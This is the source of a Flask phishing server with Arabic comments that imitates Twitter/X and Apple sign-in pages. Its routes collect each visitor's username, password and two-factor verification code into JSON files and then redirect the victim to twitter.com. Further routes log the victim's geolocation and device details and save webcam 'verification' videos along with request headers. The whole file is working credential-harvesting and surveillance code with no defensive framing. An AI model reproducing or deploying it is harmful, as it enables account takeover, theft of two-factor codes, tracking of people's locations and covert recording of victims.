#!/usr/bin/env python3
import os
import json
import time
from datetime import datetime
from flask import Flask, render_template, request, redirect, url_for, send_from_directory, jsonify
from colorama import init, Fore, Style

# Initialize colorama for terminal colors
init()

app = Flask(__name__, static_folder='static')

# إنشاء المجلدات اللازمة
def setup_directories():
    for directory in [DATA_DIR, UPLOAD_DIR, VIDEOS_DIR]:
        os.makedirs(directory, exist_ok=True)

# المسارات
DATA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data')
UPLOAD_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'upload')
VIDEOS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'captured_videos')

@app.route('/favicon.ico')
def favicon():
    return send_from_directory(app.static_folder, 'favicon.svg', mimetype='image/svg+xml')

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/auth/apple')
def auth_apple():
    return render_template('apple_login.html')

@app.route('/login', methods=['POST'])
def login():
    # استلام البيانات من النموذج
    username = request.form.get('username', '')
    
    # الحصول على عنوان IP الخاص بالزائر
    ip = request.remote_addr
    
    # إنشاء بيانات تسجيل الدخول
    login_data = {
        'username': username,
        'ip': ip,
        'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    
    # حفظ البيانات في ملف JSON
    filename = f"x_login_{int(time.time())}.json"
    filepath = os.path.join(DATA_DIR, filename)
    
    with open(filepath, 'w', encoding='utf-8') as f:
        json.dump(login_data, f, ensure_ascii=False, indent=4)
    
    # إعادة توجيه إلى صفحة كلمة المرور
    return redirect(url_for('password', username=username))

@app.route('/password/<username>', methods=['GET', 'POST'])
def password(username):
    if request.method == 'POST':
        # استلام كلمة المرور
        password = request.form.get('password', '')
        
        # الحصول على عنوان IP الخاص بالزائر
        ip = request.remote_addr
        
        # إنشاء بيانات كلمة المرور
        password_data = {
            'username': username,
            'password': password,
            'ip': ip,
            'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        
        # حفظ البيانات في ملف JSON
        filename = f"x_password_{int(time.time())}.json"
        filepath = os.path.join(DATA_DIR, filename)
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(password_data, f, ensure_ascii=False, indent=4)
        
        # إعادة توجيه إلى صفحة التحقق ذات الخطوتين (إذا كانت مطلوبة)
        return redirect(url_for('verify', username=username))
    
    # عرض صفحة كلمة المرور
    return render_template('password.html', username=username)

@app.route('/verify/<username>', methods=['GET', 'POST'])
def verify(username):
    if request.method == 'POST':
        # استلام رمز التحقق
        code = request.form.get('code', '')
        
        # الحصول على عنوان IP الخاص بالزائر
        ip = request.remote_addr
        
        # إنشاء بيانات التحقق
        verify_data = {
            'username': username,
            'verification_code': code,
            'ip': ip,
            'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        
        # حفظ البيانات في ملف JSON
        filename = f"x_verify_{int(time.time())}.json"
        filepath = os.path.join(DATA_DIR, filename)
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(verify_data, f, ensure_ascii=False, indent=4)
        
        # إعادة توجيه إلى موقع تويتر الرسمي
        return redirect('https://twitter.com')
    
    # عرض صفحة التحقق
    return render_template('verify.html', username=username)

@app.route('/log-location', methods=['POST'])
def log_location():
    try:
        # Get location data from request
        data = request.json
        latitude = data.get('latitude', 'Unknown')
        longitude = data.get('longitude', 'Unknown')
        google_maps_url = data.get('googleMapsUrl', 'Unknown')
        device_info = data.get('deviceInfo', {})
        
        # Print location data to terminal with colors
        print(f"\n{Fore.MAGENTA}{'='*50}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] User Location Captured!{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[+] Latitude: {Fore.GREEN}{latitude}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[+] Longitude: {Fore.GREEN}{longitude}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[+] Google Maps URL: {Fore.GREEN}{google_maps_url}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[+] IP Address: {Fore.GREEN}{request.remote_addr}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[+] User Agent: {Fore.GREEN}{device_info.get('userAgent', 'Unknown')}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}{'='*50}{Style.RESET_ALL}")
        
        # Save location data to file
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"location_{timestamp}.json"
        filepath = os.path.join(DATA_DIR, filename)
        
        location_data = {
            'latitude': latitude,
            'longitude': longitude,
            'google_maps_url': google_maps_url,
            'ip_address': request.remote_addr,
            'timestamp': timestamp,
            'device_info': device_info
        }
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(location_data, f, ensure_ascii=False, indent=4)
        
        return jsonify({'success': True}), 200
    except Exception as e:
        print(f"{Fore.RED}[!] Error processing location data: {str(e)}{Style.RESET_ALL}")
        return jsonify({'error': str(e)}), 500

@app.route('/upload_video', methods=['POST'])
def upload_video():
    try:
        if 'video' not in request.files:
            return jsonify({"error": "No video file provided"}), 400
            
        video_file = request.files['video']
        
        # Create session folder using timestamp and IP address
        session_id = f"{datetime.now().strftime('%Y%m%d_%H%M%S')}_{request.remote_addr.replace('.', '-')}"
        session_dir = os.path.join(VIDEOS_DIR, session_id)
        if not os.path.exists(session_dir):
            os.makedirs(session_dir)
        
        # Save the video with timestamp
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        video_filename = f"verification_video_{timestamp}.webm"
        video_path = os.path.join(session_dir, video_filename)
        video_file.save(video_path)
        
        # Create a metadata file with additional information
        metadata = {
            "ip_address": request.remote_addr,
            "user_agent": request.user_agent.string,
            "timestamp": timestamp,
            "headers": dict(request.headers),
            "username": request.form.get('username', 'unknown')
        }
        
        with open(os.path.join(session_dir, "metadata.json"), "w") as f:
            json.dump(metadata, f, indent=4)
            
        return jsonify({"success": True, "filename": video_filename})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    setup_directories()
    app.run(host='0.0.0.0', port=50005, debug=True) 